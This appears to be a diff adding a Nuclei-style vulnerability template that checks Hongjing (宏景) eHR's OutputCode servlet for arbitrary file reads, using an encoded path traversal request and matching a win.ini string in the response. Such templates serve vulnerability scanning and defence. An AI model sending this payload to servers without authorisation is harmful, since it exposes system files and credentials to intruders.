@@ -1,0 +1,26 @@
+id: HJeHR-OutputCode-File-reading
+
+info:
+  name: "宏景eHR OutputCode 接口任意文件读取"
+  author: Unknown
+  severity: high
+  description: 宏景eHR系统中的OutputCode接口存在任意文件读取漏洞。攻击者可通过构造恶意请求读取服务器上的任意文件内容，导致敏感信息泄露（如系统配置文件、数据库凭证等）。该漏洞源于接口未正确校验文件路径参数，允许通过路径穿越字符访问非预期文件。
+  tags: 宏景eHR
+
+http:
+- raw:
+  - |
+    GET /servlet/OutputCode?path=VHmj0PAATTP2HJBPAATTPcyRcHb6hPAATTP2HJFPAATTP59XObqwUZaPAATTP2HJBPAATTP6EvXjT HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '; for 16-bit app support'
+  - type: status
+    status:
+    - 200
+
